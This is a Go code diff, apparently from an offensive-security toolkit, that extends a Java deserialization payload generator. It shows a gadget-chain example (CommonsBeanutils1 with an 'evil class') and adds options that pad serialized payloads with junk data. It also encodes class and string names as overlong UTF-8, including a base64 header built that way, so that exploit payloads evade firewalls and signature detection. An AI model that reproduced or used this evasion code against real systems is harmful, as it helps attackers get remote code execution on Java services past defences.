@@ -499,16 +499,45 @@ func ToBcel(i interface{}) (string, error) {
 // Example:
 // ```
 // gadgetObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useBytesEvilClass(bytesCode),yso.obfuscationClassConstantPool(),yso.evilClassName(className),yso.majorVersion(version))
-// gadgetBytes,_ = yso.ToBytes(gadgetObj)
+// gadgetBytes,_ = yso.ToBytes(gadgetObj,yso.dirtyDataLength(10000),yso.twoBytesCharString())
 // ```
-func ToBytes(i interface{}) ([]byte, error) {
+func ToBytes(i interface{}, opts ...MarshalOptionFun) ([]byte, error) {
+	cfg := &yserx.MarshalContext{
+		DirtyDataLength:  0,
+		StringCharLength: 1,
+	}
+	for _, opt := range opts {
+		opt(cfg)
+	}
 	switch ret := i.(type) {
 	case *javaclassparser.ClassObject:
-		return ret.Bytes(), nil
+		return ret.ToBytesByCustomStringChar(cfg.StringCharLength), nil
 	case yserx.JavaSerializable:
-		return yserx.MarshalJavaObjects(ret), nil
+		res := yserx.MarshalJavaObjectWithConfig(ret, cfg)
+		if cfg.DirtyDataLength > 0 {
+			return WrapSerializeDataByDirtyData(res, cfg.DirtyDataLength)
+		}
+		return res, nil
 	default:
 		return nil, utils.Errorf("cannot support %v to bytes", reflect.TypeOf(ret))
+	}
+}
+
+type MarshalOptionFun func(ctx *yserx.MarshalContext)
+
+func SetToBytesDirtyDataLength(length int) MarshalOptionFun {
+	return func(ctx *yserx.MarshalContext) {
+		ctx.DirtyDataLength = length
+	}
+}
+func SetToBytesThreeBytesString() MarshalOptionFun {
+	return func(ctx *yserx.MarshalContext) {
+		ctx.StringCharLength = 3
+	}
+}
+func SetToBytesTwoBytesString() MarshalOptionFun {
+	return func(ctx *yserx.MarshalContext) {
+		ctx.StringCharLength = 2
 	}
 }
 
@@ -820,6 +849,7 @@ func runWorkFlow(works ...func() error) error {
 }
 
 var dirtyDataHeader []byte
+var dirtyDataHeaderByOverLongString []byte
 
 func init() {
 	bs, err := codec.DecodeBase64("rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cA==")
@@ -827,13 +857,18 @@ func init() {
 		log.Errorf("init dirtyDataHeader failed: %v", err)
 	}
 	dirtyDataHeader = bs
+	bs, err = codec.DecodeBase64("rO0ABXVyACbBm8GMwarBocG2waHArsGswaHBrsGnwK7Bj8GiwarBpcGjwbTAu5DOWJ8QcylsAgAAeHA=")
+	if err != nil {
+		log.Errorf("init dirtyDataHeader failed: %v", err)
+	}
+	dirtyDataHeaderByOverLongString = bs
 }
 
-// WarpSerializeDataByDirtyData 通过脏数据包装序列化数据
-// Example: warpedSerData = WarpByDirtyData(serData,1000)~
-func WarpSerializeDataByDirtyData(serBytes []byte, length int) ([]byte, error) {
+// WrapSerializeDataByDirtyData 通过脏数据包装序列化数据
+// Example: wrapSerData = WrapByDirtyData(serData,1000)~
+func WrapSerializeDataByDirtyData(serBytes []byte, length int) ([]byte, error) {
 	buf := bytes.Buffer{}
-	buf.Write(dirtyDataHeader)
+	buf.Write(dirtyDataHeaderByOverLongString)
 	buf.Write(yserx.IntTo4Bytes(2))
 	buf.Write([]byte{0x7C})
 	buf.Write(yserx.Uint64To8Bytes(uint64(length)))
